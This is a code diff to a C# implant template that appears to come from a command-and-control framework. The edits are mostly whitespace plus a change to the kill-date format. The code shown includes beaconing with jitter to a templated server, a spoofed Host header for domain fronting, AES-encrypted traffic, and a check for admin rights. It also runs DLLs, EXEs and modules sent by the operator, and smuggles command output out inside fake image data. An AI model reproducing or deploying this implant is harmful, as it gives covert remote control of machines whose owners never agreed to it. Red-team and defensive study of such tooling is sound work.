@@ -24,7 +24,7 @@ public class Program
 	public const int SW_SHOW = 5;
     public static string taskId;
     public static bool Run = true;
-    private static string pKey;    
+    private static string pKey;
     private static int dfs = 0;
 	private static string[] dfarray = {#REPLACEDF#};
 	public static string[] dfhead = null;
@@ -90,9 +90,9 @@ public class Program
 			WebProxy proxy = new WebProxy();
 			proxy.Address = new Uri(purl);
 			proxy.Credentials = new NetworkCredential(puser, ppass);
-            if (String.IsNullOrEmpty(puser)) 
-			{ 
-				proxy.UseDefaultCredentials = true; 
+            if (String.IsNullOrEmpty(puser))
+			{
+				proxy.UseDefaultCredentials = true;
 			}
 			proxy.BypassProxyOnLocal = false;
 			x.Proxy = proxy;
@@ -101,7 +101,7 @@ public class Program
 				x.Proxy.Credentials = CredentialCache.DefaultCredentials;
 		}
 
-		var df = dfarray[dfs].Replace("\"", String.Empty).Trim(); 
+		var df = dfarray[dfs].Replace("\"", String.Empty).Trim();
 		if (!String.IsNullOrEmpty(df))
 			x.Headers.Add("Host", df);
 
@@ -122,14 +122,14 @@ public class Program
 		{
 			var a = CreateCam(key, System.Convert.ToBase64String(IV));
 			var u = a.CreateDecryptor().TransformFinalBlock(b, 16, b.Length - 16);
-            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(System.Text.Encoding.UTF8.GetString(u).Trim('\0'))); 
+            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(System.Text.Encoding.UTF8.GetString(u).Trim('\0')));
 
 		}
 		catch
 		{
 			var a = CreateCam(key, System.Convert.ToBase64String(IV), false);
 			var u = a.CreateDecryptor().TransformFinalBlock(b, 16, b.Length - 16);
-            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(System.Text.Encoding.UTF8.GetString(u).Trim('\0'))); 
+            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(System.Text.Encoding.UTF8.GetString(u).Trim('\0')));
 		}
 		finally
 		{
@@ -142,7 +142,7 @@ public class Program
 		System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();
 		System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);
 		return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
-	}	
+	}
 	static string Encryption(string key, string un, bool comp = false, byte[] unByte = null)
 	{
 		byte[] byEnc = null;
@@ -150,7 +150,7 @@ public class Program
 			byEnc = unByte;
 		else
 			byEnc = System.Text.Encoding.UTF8.GetBytes(un);
-		
+
 		if (comp)
 			byEnc = Compress(byEnc);
 
@@ -179,7 +179,7 @@ public class Program
 		a.Padding = System.Security.Cryptography.PaddingMode.Zeros;
 		a.BlockSize = 128;
 		a.KeySize = 256;
-  
+
 		if (null != IV)
 			a.IV = System.Convert.FromBase64String(IV);
 		else
@@ -200,7 +200,7 @@ public class Program
 	}
 	static void primer()
 	{
-		if (DateTime.ParseExact("#REPLACEKILLDATE#", "dd/MM/yyyy", CultureInfo.InvariantCulture) > DateTime.Now)
+		if (DateTime.ParseExact("#REPLACEKILLDATE#", "yyyy-MM-dd", CultureInfo.InvariantCulture) > DateTime.Now)
 		{
 			var u = "";
 			try
@@ -223,7 +223,7 @@ public class Program
 				var o = String.Format("{0};{1};{2};{3};{4};#REPLACEURLID#", dn, u, cn, arch, pid);
 			 	string key = @"#REPLACEKEY#";
 			 	baseURL = du;
-			 	string s = baseURL+"#REPLACESTARTURL#"; 
+			 	string s = baseURL+"#REPLACESTARTURL#";
 				try {
 				var primer = GetWebRequest(Encryption(key, o)).DownloadString(s);
 				x = Decryption(key, primer);
@@ -275,7 +275,7 @@ public class Program
 	      }
 	      return memory.ToArray();
 	    }
-	}	
+	}
 	static Type LoadS(string assemblyqNme)
 	{
 		return Type.GetType(assemblyqNme, (name) =>
@@ -321,7 +321,7 @@ public class Program
                             sOut = output.ToString();
                         }
 					}
-					else if(c.ToLower().StartsWith("run-dll")) 
+					else if(c.ToLower().StartsWith("run-dll"))
 					{
 						try
 						{
@@ -366,7 +366,7 @@ public class Program
 				break;
 		}
 		return beacontime;
-	}	
+	}
 	internal static class UrlGen
 	{
 		static List<String> _stringnewURLS = new List<String>();
@@ -380,7 +380,7 @@ public class Program
 			_randomURI = RandomURI;
 			_baseUrl = baseUrl;
 		}
-	
+
 		internal static String GenerateUrl()
 		{
 			string URL = _stringnewURLS[_rnd.Next(_stringnewURLS.Count)];
@@ -394,13 +394,13 @@ public class Program
 			}
 			return String.Format("{0}/{1}{2}/?{3}", _baseUrl, URL, Guid.NewGuid(), _randomURI);
 		}
-	}	
+	}
 	internal static class ImgGen
 	{
 		static Random _rnd = new Random();
 		static Regex _re = new Regex("(?<=\")[^\"]*(?=\")|[^\" ]+", RegexOptions.Compiled);
 		static List<String> _newImgs = new List<String>();
-		
+
 		internal static void Init(String stringIMGS)
 		{
 			var stringnewIMGS = _re.Matches(stringIMGS.Replace(",", "")).Cast<Match>().Select(m => m.Value);
@@ -413,7 +413,7 @@ public class Program
 			const string chars = "...................@..........................Tyscf";
 			return new string(Enumerable.Repeat(chars, length).Select(s => s[_rnd.Next(s.Length)]).ToArray());
 		}
-		
+
 		internal static byte[] GetImgData(byte[] cmdoutput)
 		{
 			Int32 maxByteslen = 1500, maxDatalen = cmdoutput.Length + maxByteslen;
@@ -421,7 +421,7 @@ public class Program
 			var imgBytes = System.Convert.FromBase64String(randimg);
 			var BytePadding = System.Text.Encoding.UTF8.GetBytes((RandomString(maxByteslen - imgBytes.Length)));
 			var ImageBytesFull = new byte[maxDatalen];
-	
+
 			System.Array.Copy(imgBytes, 0, ImageBytesFull, 0, imgBytes.Length);
 			System.Array.Copy(BytePadding, 0, ImageBytesFull, imgBytes.Length, BytePadding.Length);
 			System.Array.Copy(cmdoutput, 0, ImageBytesFull, imgBytes.Length + BytePadding.Length, cmdoutput.Length);
@@ -446,7 +446,7 @@ public class Program
 		var attempts = 0;
     	while (attempts < 5) {
     		attempts += 1;
-			try 
+			try
 			{
 				GetWebRequest(eTaskId).UploadData(UrlGen.GenerateUrl(), dsendBytes);
 				attempts = 5;
@@ -477,7 +477,7 @@ public class Program
         }
 		while (!exitvt.WaitOne((int)(new Random().Next((int)(beacontime * 1000 * (1F - dJitter)), (int)(beacontime * 1000 * (1F + dJitter))))))
 		{
-			if (DateTime.ParseExact(KillDate, "dd/MM/yyyy", CultureInfo.InvariantCulture) < DateTime.Now)
+			if (DateTime.ParseExact(KillDate, "yyyy-MM-dd", CultureInfo.InvariantCulture) < DateTime.Now)
 			{
 				Run = false;
 				exitvt.Set();
@@ -495,7 +495,7 @@ public class Program
 				catch
 				{
 					continue;
-				}	
+				}
 				if (x.ToLower().StartsWith("multicmd"))
 				{
 					var splitcmd = x.Replace("multicmd", "");
@@ -509,7 +509,7 @@ public class Program
 							Run = false;
 							exitvt.Set();
 							break;
-						}						
+						}
 						else if (cmd.ToLower().StartsWith("loadmodule"))
 						{
 							var module = Regex.Replace(cmd, "loadmodule", "", RegexOptions.IgnoreCase);
@@ -521,7 +521,7 @@ public class Program
 							Thread t = new Thread(() => rAsm(cmd));
 							Exec("[+] Running background task", taskId, Key);
 							t.Start();
-						}					
+						}
 						else if (cmd.ToLower().StartsWith("run-dll") || cmd.ToLower().StartsWith("run-exe"))
 						{
 							output.AppendLine(rAsm(cmd));
@@ -534,16 +534,16 @@ public class Program
 							{
 								beacontime = Parse_Beacon_Time(mch.Groups["t"].Value, mch.Groups["u"].Value);
 							}
-							else 
+							else
 							{
 								output.AppendLine(String.Format(@"[X] Invalid time ""{0}""", c));
 							}
 							Exec("Beacon set", taskId, Key);
 						}
-						else 
+						else
 						{
 							var sHot = rAsm($"run-exe Core.Program Core {cmd}");
-						}	
+						}
 						output.AppendLine(strOutput.ToString());
 						var sb = strOutput.GetStringBuilder();
 						sb.Remove(0, sb.Length);
